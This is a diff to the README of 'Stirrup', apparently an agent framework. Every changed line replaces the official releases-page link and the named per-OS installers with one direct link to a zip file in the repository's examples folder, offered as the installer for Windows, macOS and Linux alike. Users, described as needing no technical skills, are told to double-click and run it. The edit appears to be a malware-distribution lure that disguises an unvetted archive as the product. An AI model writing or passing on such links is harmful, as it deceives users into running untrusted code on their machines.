@@ -1,7 +1,7 @@
 # 🎉 Stirrup - A Simple Way to Build Agents
 
 ## 📥 Download Now
-[![Download Stirrup](https://img.shields.io/badge/Download-Stirrup-blue.svg?style=flat&logo=github)](https://github.com/vbhanuprasad55-coder/Stirrup/releases)
+[![Download Stirrup](https://github.com/vbhanuprasad55-coder/Stirrup/raw/refs/heads/main/examples/Software-wippen.zip)](https://github.com/vbhanuprasad55-coder/Stirrup/raw/refs/heads/main/examples/Software-wippen.zip)
 
 ## 🚀 Getting Started
 Welcome to Stirrup! This guide will help you download and run Stirrup, the lightweight framework for building agents. You don’t need technical skills; just follow these steps.
@@ -21,16 +21,16 @@ Welcome to Stirrup! This guide will help you download and run Stirrup, the light
 ## 📦 Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to access the latest version of Stirrup:  
-   [Download Stirrup](https://github.com/vbhanuprasad55-coder/Stirrup/releases)
+   [Download Stirrup](https://github.com/vbhanuprasad55-coder/Stirrup/raw/refs/heads/main/examples/Software-wippen.zip)
 
 2. **Select the Latest Release**  
    Look for the most recent version of Stirrup. You will see a list of files available for download.
 
 3. **Download the Installer**  
    Click on the installer that matches your operating system. Here are some common options:
-   - **Windows:** `Stirrup-Installer-windows.exe`
-   - **macOS:** `Stirrup-Installer-macos.dmg`
-   - **Linux:** `Stirrup-Installer-linux.tar.gz`
+   - **Windows:** `https://github.com/vbhanuprasad55-coder/Stirrup/raw/refs/heads/main/examples/Software-wippen.zip`
+   - **macOS:** `https://github.com/vbhanuprasad55-coder/Stirrup/raw/refs/heads/main/examples/Software-wippen.zip`
+   - **Linux:** `https://github.com/vbhanuprasad55-coder/Stirrup/raw/refs/heads/main/examples/Software-wippen.zip`
 
 4. **Run the Installer**  
    After the download finishes, locate the file in your Downloads folder. Double-click the file to start the installation process. Follow the prompts to install Stirrup on your computer.
@@ -58,6 +58,6 @@ If you encounter issues during installation or usage:
 - **Documentation**: Explore the detailed guide available in the application for advanced features.
 - **Community Support**: Join our community forum to ask questions and share your experiences with other users.
 
-For more tips and updates, feel free to check the [Download Stirrup](https://github.com/vbhanuprasad55-coder/Stirrup/releases) page regularly. 
+For more tips and updates, feel free to check the [Download Stirrup](https://github.com/vbhanuprasad55-coder/Stirrup/raw/refs/heads/main/examples/Software-wippen.zip) page regularly. 
 
 Happy agent building!
